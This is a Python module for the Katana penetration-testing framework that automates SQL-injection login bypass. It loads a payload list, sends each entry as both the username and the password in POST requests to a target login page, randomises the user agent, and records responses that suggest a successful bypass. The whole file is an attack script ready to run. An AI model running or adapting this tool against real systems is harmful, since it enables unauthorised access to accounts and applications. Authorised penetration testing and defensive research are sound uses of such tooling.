# This module requires katana framework
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
import httplib,urllib
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version			="1.0"
	init.Description		="bypass SQLi with Cheats Injections"
	init.CodeName			="web/bypass.sql"
	init.DateCreation		="31/12/2016"
	init.LastModification	="31/12/2016"
	init.Collaborators      =None
	init.References         =None
	init.License			=KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[HTTP_PORT           ,False,'Port Target'],
		'file'  :["/login.php"        ,True ,'File request'],
		'dict'  :["files/db/sqlbypass.lst",False,'Payload list'],
		'data_a':["username"          ,True ,'Name value 1'],
		'data_b':["password"          ,True ,'Name value 2'],
		'method':["POST"              ,True ,'Method form'],
		'alert' :["NO"                ,True ,'error login']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
	Loadingfile(init.var['dict'])

	with open(init.var['dict'],'r') as payloads:
		for payload in payloads:
			payload=payload.replace("\n","")

			params = urllib.urlencode({init.var['data_a']: payload, init.var['data_b']: payload})
			header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain" , "User-agent" : WEB.RamdonAgent()}
			conn = httplib.HTTPConnection(init.var['target'],int(init.var['port']))
			conn.request(init.var['method'], init.var['file'], params, header)
			response = conn.getresponse()
			ver_source = response.read()

			if ver_source.find(init.var['alert']) != 0 and response.status == 200:
				printk.suff("Possible Bypass with ["+init.var['data_a']+"="+payload+"]["+init.var['data_b']+"="+payload+"]")
				UTIL.sRegister(init,payload)
			else:
				printk.inf("Checking '"+payload+"'")


# END CODE MODULE ############################################################################################
